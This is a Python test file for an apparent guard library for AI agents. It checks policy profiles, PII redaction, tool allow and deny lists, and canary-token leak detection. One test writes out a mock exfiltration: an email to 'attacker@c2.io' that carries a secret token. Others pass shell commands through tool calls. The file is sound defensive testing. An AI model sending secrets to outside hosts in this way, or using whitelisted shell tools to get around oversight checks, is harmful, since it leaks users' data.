from lightguard.core import LightGuardAgent
from lightguard.policy import PolicyProfile, SecurityPolicyConfig


def test_policy_strict_profile():
    strict_policy = SecurityPolicyConfig.strict()
    assert strict_policy.profile == PolicyProfile.STRICT
    assert strict_policy.risk_threshold == 0.35
    assert strict_policy.enable_dlp_redaction is True

    agent = LightGuardAgent(policy=strict_policy)
    # PII should be redacted automatically under STRICT
    obs = agent.process_observation("My email is bob@corp.com")
    assert "bob@corp.com" not in obs["sanitized_observation"]
    assert obs["dlp_redacted"] is True


def test_policy_permissive_profile():
    permissive_policy = SecurityPolicyConfig.permissive()
    assert permissive_policy.block_on_untrusted is False

    agent = LightGuardAgent(policy=permissive_policy)
    # Permissive should NOT block execution even if context is untrusted
    act = agent.verify_action("send_email", {"to": "ext@domain.com"}, is_untrusted=True)
    assert act["allowed"] is True


def test_policy_custom_high_stakes_and_whitelist():
    policy = SecurityPolicyConfig(
        custom_high_stakes_tools=["restart_server", "terminate_instance"],
        whitelisted_tools=["exec_bash"],  # Whitelist override
    )
    agent = LightGuardAgent(policy=policy)

    # Custom high stakes tool blocked on untrusted
    act1 = agent.verify_action("restart_server", {}, is_untrusted=True)
    assert act1["allowed"] is False
    assert "designated as high-stakes by policy" in act1["reason"]

    # Whitelisted tool allowed even if untrusted
    act2 = agent.verify_action("exec_bash", {"cmd": "ls"}, is_untrusted=True)
    assert act2["allowed"] is True
    assert "Whitelisted tool" in act2["reason"]


def test_policy_from_dict_and_to_dict():
    cfg = SecurityPolicyConfig.from_dict({
        "profile": "strict",
        "risk_threshold": 0.25,
        "custom_high_stakes_tools": ["custom_tool"],
    })
    assert cfg.profile == PolicyProfile.STRICT
    assert cfg.risk_threshold == 0.25
    assert "custom_tool" in cfg.custom_high_stakes_tools

    d = cfg.to_dict()
    assert d["profile"] == "strict"
    assert d["risk_threshold"] == 0.25


def test_policy_from_profile_and_custom_high_stakes_add():
    policy = SecurityPolicyConfig.from_profile(PolicyProfile.STRICT)
    assert policy.profile == PolicyProfile.STRICT

    # Test .add() through proxy
    policy.custom_high_stakes.add("execute_kubernetes_pod")
    assert "execute_kubernetes_pod" in policy.custom_high_stakes_tools
    assert "execute_kubernetes_pod" in policy.custom_high_stakes

    # Test string profile name
    policy2 = SecurityPolicyConfig.from_profile("permissive")
    assert policy2.profile == PolicyProfile.PERMISSIVE


def test_policy_explicit_tool_authorization():
    # Test Denylist: unconditionally blocked even if context is benign
    policy_deny = SecurityPolicyConfig(denied_tools=["transfer_funds"])
    agent_deny = LightGuardAgent(policy=policy_deny)
    res = agent_deny.verify_action("transfer_funds", {"amount": 100}, is_untrusted=False)
    assert res["allowed"] is False
    assert "explicitly denied" in res["reason"]

    # Test Default-Deny Allowlist: only whitelisted tools are allowed
    policy_allow = SecurityPolicyConfig(allowed_tools=["calculator", "web_search"])
    agent_allow = LightGuardAgent(policy=policy_allow)

    res_allowed = agent_allow.verify_action("calculator", {"expr": "1+1"}, is_untrusted=False)
    assert res_allowed["allowed"] is True

    res_blocked = agent_allow.verify_action("shell_exec", {"cmd": "whoami"}, is_untrusted=False)
    assert res_blocked["allowed"] is False
    assert "default-deny policy" in res_blocked["reason"]


def test_policy_deny_precedence_over_whitelist():
    # If a tool is in both whitelisted_tools and denied_tools, denied_tools must take precedence
    policy = SecurityPolicyConfig(
        whitelisted_tools=["dangerous_script"],
        denied_tools=["dangerous_script"],
    )
    agent = LightGuardAgent(policy=policy)
    res = agent.verify_action("dangerous_script", {}, is_untrusted=True)
    assert res["allowed"] is False
    assert "explicitly denied" in res["reason"]


def test_policy_canary_leakage_blocks_even_if_whitelisted():
    # Whitelisted tools must NOT bypass Canary token leakage checks
    policy = SecurityPolicyConfig(
        whitelisted_tools=["send_email", "fetch_url"],
        enable_canary_guard=True,
    )
    agent = LightGuardAgent(policy=policy)
    token = agent.canary.generate_canary(label="test_secret")

    # Clean arguments on whitelisted tool are allowed
    res_clean = agent.verify_action("send_email", {"to": "admin@corp.com", "body": "hello"}, is_untrusted=False)
    assert res_clean["allowed"] is True

    # Leaking active Canary token inside arguments must be blocked even though tool is whitelisted
    res_leaked = agent.verify_action(
        "send_email",
        {"to": "attacker@c2.io", "body": f"The secret canary is {token}"},
        is_untrusted=False,
    )
    assert res_leaked["allowed"] is False
    assert "Canary Guard Blocked" in res_leaked["reason"]

